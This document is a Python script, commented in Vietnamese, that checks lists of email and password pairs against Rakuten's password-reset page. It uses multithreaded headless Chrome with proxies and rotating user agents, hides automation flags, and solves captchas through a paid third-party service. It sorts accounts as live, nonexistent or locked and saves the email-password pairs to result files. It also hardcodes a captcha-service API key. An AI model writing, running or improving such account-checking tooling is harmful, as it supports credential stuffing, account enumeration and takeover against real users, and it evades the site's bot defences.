import shutil
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver import ActionChains
import json
import base64
import requests
import time
import random
import logging
import threading
from queue import Queue
import os
import pyautogui
import colorama
from datetime import datetime
import signal
import sys
import atexit
import chromedriver_autoinstaller
import psutil
import shutil
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import WebDriverException

colorama.init()

drivers = []
drivers_lock = threading.RLock()
successful_accounts = []
failed_accounts = []

API_KEY = "GEM_WS2N6XYJYJJCB9VQ70HWMRCEBIHZK54VEXQ7FGOGYMEOXT5XLLZS0DJQRK2GZI1775533151"
def kill_child_processes(pid, sig=15):
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        for child in children:
            try:
                child.send_signal(sig)
            except Exception:
                pass
        gone, alive = psutil.wait_procs(children, timeout=3)
        for p in alive:
            try:
                p.kill()
            except Exception:
                pass
    except Exception as e:
        pass
        # logging.warning(f"Không thể kill process con cho PID {pid}: {e}")

def cleanup_drivers():
    """Dọn dẹp tất cả các WebDriver instances."""
    logging.warning("Đang dọn dẹp drivers...")
    with drivers_lock:
        snapshot = drivers[:]

    for driver in snapshot:
        safe_shutdown_driver(driver)


def is_invalid_session_error(error):
    """Nhận diện lỗi session đã đóng để tránh log warning gây nhiễu."""
    message = str(error).lower()
    return "invalid session id" in message or "session deleted as the browser has closed the connection" in message


def safe_shutdown_driver(driver):
    """Đóng driver an toàn, có thể gọi lặp lại mà không gây lỗi phụ."""
    if not driver:
        return

    service_pid = None
    try:
        if hasattr(driver, "service") and getattr(driver.service, "process", None):
            service_pid = driver.service.process.pid
    except Exception:
        service_pid = None

    try:
        # quit() là đủ để đóng toàn bộ browser/session.
        driver.quit()
    except (WebDriverException, Exception) as e:
        if is_invalid_session_error(e):
            logging.info("Driver session đã đóng trước đó, bỏ qua lỗi cleanup.")
        else:
            logging.warning(f"Lỗi khi đóng driver: {e}")
    finally:
        if service_pid:
            kill_child_processes(service_pid)
        with drivers_lock:
            if driver in drivers:
                drivers.remove(driver)

def signal_handler(sig, frame):
    """Xử lý SIGINT (Ctrl+C) và SIGTERM (đóng terminal)."""
    logging.info("Nhận tín hiệu dừng. Đang dọn dẹp...")
    cleanup_drivers()
    clean_all_user_data()
    logging.info("Dọn dẹp hoàn tất. Thoát...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('rakuten_automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs from undetected_chromedriver and other modules
logging.getLogger('undetected_chromedriver').setLevel(logging.WARNING)
logging.getLogger('selenium').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.RLock()
show_browser = True

def load_input_files():
    """Tải tài khoản từ accounts.txt và proxy từ proxy.txt"""
    try:
        # Load accounts (email|password|name)
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '||' in line:
                    parts = line.split('||')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })
        
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username-password
                            try:
                                host_port, credentials = line.split('@', 1)
                                proxies.append({
                                    'host_port': host_port,
                                    'credentials': credentials,
                                    'full': line
                                })
                            except:
                                proxies.append({'host_port': line, 'credentials': None, 'full': line})
                        else:
                            # Standard format: host:port or host:port:user:pass
                            proxies.append({'host_port': line, 'credentials': None, 'full': line})
        except FileNotFoundError:
            logging.warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.")
        
        if not accounts:
            logging.error("Không tìm thấy tài khoản hợp lệ trong accounts.txt")
            raise ValueError("Không có tài khoản để xử lý")
        
        logging.info(f"Đã tải {len(accounts)} tài khoản và {len(proxies)} proxy")
        return accounts, proxies
    
    except Exception as e:
        logging.error(f"Lỗi khi tải file đầu vào: {repr(e)}")
        raise


def init_driver(proxy=None, email=None, row=0, col=0, size=(1920, 1080)):
    """Khởi tạo Chrome driver với cài đặt không bị phát hiện"""
    options = uc.ChromeOptions()
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-infobars')
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--allow-insecure-localhost')
    options.add_argument('--allow-running-insecure-content')
    options.add_argument('--disable-web-security')
    options.add_argument('--disable-gpu')
    if proxy and proxy['credentials']:
        # form the proxy address
        proxy_address = f"http://{proxy['credentials'].split(':')[0]}:{proxy['credentials'].split(':')[1]}@{proxy['host_port'].split(':')[0]}:{proxy['host_port'].split(':')[1]}"

        # add the proxy address to proxy options
        proxy_options = {
            "proxy": {
                "http": proxy_address,
                "https": proxy_address,
            }
        }

    # Random user agent
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0"
    ]
    options.add_argument(f'--user-agent={random.choice(user_agents)}')
    
    # User data directory
    # user_data_dir = os.path.join(os.getcwd(), "user-data")
    # if email:
    #     user_data_dir = os.path.join(user_data_dir, f"user-data-{email.replace('@', '_').replace('.', '_')}")
    # if not os.path.exists(user_data_dir):
    #     os.makedirs(user_data_dir)
    # options.add_argument(f'--user-data-dir={user_data_dir}')
    
    # Headless mode
    options.headless = (not show_browser)
    
    try:
        version_main = chromedriver_autoinstaller.get_chrome_version()
        version_main = int(version_main.split('.')[0])
    except:
        version_main = None
    
    driver = uc.Chrome(
        # seleniumwire_options=proxy_options if proxy and proxy['credentials'] else None,
        options=options,
        version_main=version_main,
        use_subprocess=True,
        headless=(not show_browser)
    )
    
    # Set window position and size
    # if show_browser:
    #     width, height = size
    #     x = col * width
    #     y = row * height
    #     driver.set_window_rect(x=x, y=y, width=width, height=height)
    # else:
    #     driver.set_window_size(1920, 1080)

    
    # Anti-detection scripts
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": """
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            window.navigator.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        """
    })
    
    return driver

def resolve_captcha(base64_image):
    if not API_KEY or API_KEY == "YOUR_GEMCAPTCHA_API_KEY":
        logging.error("GemCaptcha API key chưa được cấu hình.")
        return ""

    create_task_url = "https://api.gemcaptcha.com/v2/createTask"
    get_result_url = "https://api.gemcaptcha.com/v2/getTaskResult"


    try:
        create_payload = {
            "clientKey": API_KEY,
            "task": {
                "type": "ImageToTextTask",
                "imageBase64": base64_image,
                "module": "module_1"
            }
        }
        create_resp = requests.post(create_task_url, json=create_payload, timeout=30)
        create_resp.raise_for_status()
        create_data = create_resp.json()

        if create_data.get("errorId") != 0:
            logging.error(f"GemCaptcha createTask lỗi: {create_data}")
            return ""

        task_id = create_data.get("taskId")
        if not task_id:
            logging.error(f"GemCaptcha không trả về taskId: {create_data}")
            return ""

        max_wait_seconds = 60
        poll_interval_seconds = 2
        deadline = time.time() + max_wait_seconds

        while time.time() < deadline:
            result_payload = {
                "clientKey": API_KEY,
                "taskId": task_id
            }
            result_resp = requests.post(get_result_url, json=result_payload, timeout=30)
            result_resp.raise_for_status()
            result_data = result_resp.json()

            if result_data.get("errorId") != 0:
                logging.error(f"GemCaptcha getTaskResult lỗi: {result_data}")
                return ""

            status = result_data.get("status")
            if status == "ready":
                solved_text = (result_data.get("solution") or {}).get("text", "").strip()
                if solved_text:
                    return solved_text
                logging.error(f"GemCaptcha trả về trạng thái ready nhưng không có text: {result_data}")
                return ""

            if status == "processing" or status == "waiting":
                time.sleep(poll_interval_seconds)
                continue

            logging.error(f"GemCaptcha trả về trạng thái không hợp lệ: {result_data}")
            return ""

        logging.error("GemCaptcha timeout khi chờ kết quả captcha.")
        return ""
    except Exception as e:
        logging.error(f"Lỗi resolve captcha: {repr(e)}")
        return ""


def extract_captcha_base64(img_src):
    """Lấy ảnh captcha dạng base64 từ imgSrc (data URL hoặc URL thường)."""
    try:
        if img_src and img_src.startswith("data:image") and "," in img_src:
            return img_src.split(",", 1)[1]

        if img_src:
            response = requests.get(img_src, timeout=20)
            response.raise_for_status()
            return base64.b64encode(response.content).decode("utf-8")
    except Exception as e:
        logging.error(f"Không thể lấy captcha image từ imgSrc: {repr(e)}")

    return ""


def get_shadow_captcha_data(driver):
    """Lấy input captcha + imgSrc từ r10-challenger (shadow/component internals)."""
    script = """
        const el = document.querySelector('r10-challenger');
        if (!el || !el.challengerMain || !el.challengerMain.cores) return null;
        const core = el.challengerMain.cores.values().next();
        if (!core || core.done || !core.value || !core.value.challenge) return null;
        const challenge = core.value.challenge;
        return {
            inputEl: challenge.cres_element ?? null,
            imgSrc: challenge.imgSrc || ""
        };
    """

    try:
        result = driver.execute_script(script)
        if not result or not result.get("inputEl") or not result.get("imgSrc"):
            return None, ""
        return result.get("inputEl"), result.get("imgSrc")
    except Exception as e:
        logging.error(f"Không thể lấy captcha từ shadow root: {repr(e)}")
        return None, ""


def save_retry_account_to_file(account, message):
    """Lưu tài khoản vào file chaylai.txt khi captcha vẫn sai sau khi thử lại."""
    with file_lock:
        with open('chaylai.txt', 'a', encoding='utf-8') as f:
            f.write(f"{account['email']}|{account['password']}|{account.get('name_f', '')}|{message}\n")


def solve_and_submit_captcha(driver, account, email, max_attempts=5):
    """Giải captcha, submit và tự thử lại với captcha mới nếu bị sai."""
    for captcha_attempt in range(1, max_attempts + 1):
        challenger_input, img_src = get_shadow_captcha_data(driver)
        if not challenger_input or not img_src:
            save_retry_account_to_file(account, "Không lấy được input/src captcha từ shadow root")
            return False, "Không lấy được captcha từ shadow root"

        driver.execute_script(
            "arguments[0].value = '';"
            "arguments[0].dispatchEvent(new Event('input', { bubbles: true }));"
            "arguments[0].dispatchEvent(new Event('change', { bubbles: true }));",
            challenger_input,
        )

        base64_image = extract_captcha_base64(img_src)
        resolve_captcha_text = resolve_captcha(base64_image)

        if not resolve_captcha_text:
            logging.warning(f"⚠️ {email} - Không giải được captcha ở lần {captcha_attempt}.")
            if captcha_attempt >= max_attempts:
                save_retry_account_to_file(account, "Không giải được captcha sau khi thử lại")
                return False, "Captcha không giải được sau khi thử lại"
            time.sleep(1.5)
            continue
        
        # Uppercase the captcha text as Rakuten captcha seems to be case-insensitive but often returns lowercase
        resolve_captcha_text = resolve_captcha_text.upper()

        driver.execute_script(
            "arguments[0].value = arguments[1];"
            "arguments[0].dispatchEvent(new Event('input', { bubbles: true }));"
            "arguments[0].dispatchEvent(new Event('change', { bubbles: true }));",
            challenger_input,
            resolve_captcha_text,
        )
        time.sleep(5)
        send_email_div = WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Send email')]"))
        )
        safe_click(driver, send_email_div)

        try:
            time.sleep(5)
            WebDriverWait(driver, 8).until(
                EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Value is invalid')]"))
            )
            logging.warning(f"⚠️ {email} - Captcha sai ở lần {captcha_attempt}.")
            if captcha_attempt >= max_attempts:
                save_retry_account_to_file(account, "Captcha vẫn sai sau khi giải lại và submit lại")
                return False, "Captcha vẫn sai sau khi thử lại"
            time.sleep(5)
            continue
        except TimeoutException:
            return True, ""
        except Exception as wait_error:
            logging.error(f"❌ {email} - Lỗi khi chờ phản hồi captcha: {repr(wait_error)}")
            return False, f"Lỗi khi chờ phản hồi captcha: {repr(wait_error)}"

    return False, "Captcha xử lý thất bại"



def safe_click(driver, element):
    """Click an toàn với fallback về JavaScript"""
    try:
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
        time.sleep(0.3)
        ActionChains(driver).move_to_element(element).click().perform()
    except Exception as e:
        try:
            driver.execute_script("arguments[0].click();", element)
        except Exception as e2:
            logging.warning(f"Cả hai phương pháp click đều thất bại: {repr(e)}, {repr(e2)}")
            raise

def check_rakuten_account(driver, email, password, account):
    """Kiểm tra tài khoản Rakuten"""
    try:
        time.sleep(5)
        logging.info(f"🔍 {email} - Bắt đầu kiểm tra tài khoản...")
        driver.get("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in/forgot_password/email")
        time.sleep(5)
        # Click Forgot your password? 
        forgot_link = WebDriverWait(driver, 15).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'Forgot your password?')]")))
        safe_click(driver, forgot_link)
        time.sleep(2)
        # name="email" or id="email"
        email_input = driver.find_element(By.ID, "email")
        email_input.clear()
        email_input.send_keys(email)
        time.sleep(2)
        # captcha nằm trong component/shadow-root
        logging.info(f"🔍 {email} - Đang giải captcha nếu có...")
        captcha_ok, captcha_message = solve_and_submit_captcha(
            driver=driver,
            account=account,
            email=email,
            max_attempts=5,
        )

        if not captcha_ok:
            logging.warning(f"❌ {email} - Kiểm tra thất bại: {captcha_message}")
            return False, captcha_message
        # Check div text "Password reset link successfully sent"

        time.sleep(5)
        try:
            success_message = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Password reset link successfully sent')]")))
            if success_message:
                logging.info(f"✅ {email} - Kiểm tra thành công: Tìm thấy thông báo gửi email thành công.")
                return True, "Acc live"
        except:
            pass
            
        # check div text "The email you've entered is not associated with any existing accounts."
        try:
            error_message = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'not associated with any existing accounts')]")))
            if error_message:
                logging.info(f"❌ {email} - Kiểm tra thất bại: Tìm thấy thông báo email không tồn tại.")
                return False, "Email không tồn tại"
        except:
            pass

        # check div "Your account has been locked. Please contact us through "
        try:
            locked_message = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//div[contains(text(), 'Your account has been locked')]")))
            if locked_message:
                logging.info(f"❌ {email} - Kiểm tra thất bại: Tìm thấy thông báo tài khoản bị khóa.")
                return False, "Acc bị khóa"
        except:
            pass
        return False, "Không xác định được kết quả kiểm tra"
    
    except Exception as e:
        logging.error(f"❌ Lỗi trong quá trình Kiểm tra cho {email}: {repr(e)}")
        return False, repr(e)

def save_account_to_file(filename, account, message):
    """Lưu tài khoản vào file với thông điệp"""
    with file_lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{account['email']}|{account['password']}|{message}\n")

def process_account(driver, account, account_index):
    """Xử lý Kiểm tra một tài khoản"""
    email, password = account['email'], account['password']
    try:
        logging.info(f"Đang xử lý tài khoản {account_index + 1}: {email}")
        success, message = check_rakuten_account(driver, email, password, account)
        if success:
            with file_lock:
                successful_accounts.append(account)
            # Lưu tài khoản thành công
            save_account_to_file('successful_accounts.txt', account, "Kiểm tra thành công")
        else:
            with file_lock:
                failed_accounts.append({'account': account, 'error': message})
            # Lưu tài khoản thất bại
            save_account_to_file('failed_accounts.txt', account, message)
        logging.info(f"Hoàn tất xử lý tài khoản: {email}")
    except Exception as e:
            logging.error(f"Lỗi xử lý tài khoản {email}: {repr(e)}")
            with file_lock:
                failed_accounts.append({'account': account, 'error': repr(e)})
            save_account_to_file('failed_accounts.txt', account, repr(e))
    finally:
        # Remove account from file accounts.txt
        with file_lock:
            try:
                if os.path.exists('accounts.txt'):
                    with open('accounts.txt', 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                    with open('accounts.txt', 'w', encoding='utf-8') as f:
                        for line in lines:
                            if line.strip() and not line.startswith('#') and account['email'] not in line:
                                f.write(line)
            except Exception as e:
                logging.warning(f"Lỗi khi cập nhật accounts.txt: {repr(e)}")

def clean_all_user_data(retries=5, delay=1):
    """Dọn dẹp tất cả thư mục dữ liệu người dùng"""
    logging.info("Đang dọn dẹp dữ liệu người dùng...")
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if os.path.exists(user_data_dir):
        for _ in range(retries):
            try:
                shutil.rmtree(user_data_dir)
                logging.info("Đã dọn dẹp dữ liệu người dùng thành công.")
                break
            except PermissionError:
                logging.warning(f"Đang dọn dẹp dữ liệu. Thử lại sau {delay}s...")
                time.sleep(delay)
            except Exception as e:
                # logging.error(f"Lỗi không mong muốn khi dọn dẹp dữ liệu người dùng: {repr(e)}")
                time.sleep(delay)
        else:
            logging.error(f"Không thể dọn dẹp dữ liệu người dùng sau {retries} lần thử.")

def main():
    """Hàm chính"""
    global show_browser
    
    try:
        # Load input files
        accounts, proxies = load_input_files()
        
        # Clean previous user data
        clean_all_user_data()
        # Get number of threads
        try:
            num_threads = int(input("Nhập số luồng để chạy: "))
            if num_threads <= 0:
                logging.warning("Số luồng phải là số dương. Đặt mặc định là 1.")
                num_threads = 1
            if num_threads > len(accounts):
                logging.warning(f"Số luồng ({num_threads}) vượt quá số tài khoản ({len(accounts)}). Đặt thành {len(accounts)}.")
                num_threads = len(accounts)
        except ValueError:
            logging.warning("Đầu vào số luồng không hợp lệ. Đặt mặc định là 1.")
            num_threads = 1
        
        # Nhập lựa chọn hiển thị trình duyệt
        show = input("Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ").strip().lower()
        show_browser = show in ['y', 'yes']
        
        # Setup account queue
        account_queue = Queue()
        screen_width, screen_height = pyautogui.size()
        col = 4  # Number of columns for browser windows
        
        # Add accounts to queue
        for idx, account in enumerate(accounts):
            account_queue.put((account, idx))
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        driver_init_lock = threading.Lock()
        
        def worker():
            """Hàm worker thread"""
            driver = None
            while not account_queue.empty():
                try:
                    account, account_index = account_queue.get()
                    
                    with driver_init_lock:
                        proxy = proxies[account_index % len(proxies)] if len(proxies) > 0 else None
                        row = account_index // col
                        col_index = account_index % col
                        size = (screen_width // col, 400)
                        driver = init_driver(
                            proxy=proxy, 
                            email=account['email'], 
                            row=row, 
                            col=col_index, 
                            size=size
                        )
                        with drivers_lock:
                            drivers.append(driver)
                    
                    process_account(driver, account, account_index)
                    
                except Exception as e:
                    logging.error(f"Lỗi trong worker thread: {repr(e)}")
                
                finally:
                    if driver:
                        safe_shutdown_driver(driver)
                    
                    account_queue.task_done()
        
        # Start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, name=f"Luồng-{i+1}")
            t.start()
            threads.append(t)
        
        # Wait for all threads to complete
        for t in threads:
            t.join()
        
        # Báo cáo cuối cùng và dọn dẹp
        logging.info("Đã xử lý xong tất cả tài khoản.")
        logging.info(f"✅ Kiểm tra thành công: {len(successful_accounts)}")
        logging.info(f"❌ Kiểm tra thất bại: {len(failed_accounts)}")
        
        clean_all_user_data()
        logging.info("Chương trình hoàn tất. Thoát sau 5 giây...")
        time.sleep(5)
        
    except Exception as e:
        logging.error(f"Lỗi trong hàm main: {repr(e)}")
    finally:
        cleanup_drivers()

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        atexit.register(cleanup_drivers)
        main()
    except KeyboardInterrupt:
        logging.info("Nhận KeyboardInterrupt. Đang dọn dẹp...")
        cleanup_drivers()
        clean_all_user_data()
        logging.info("Dọn dẹp hoàn tất. Thoát...")
        sys.exit(0)
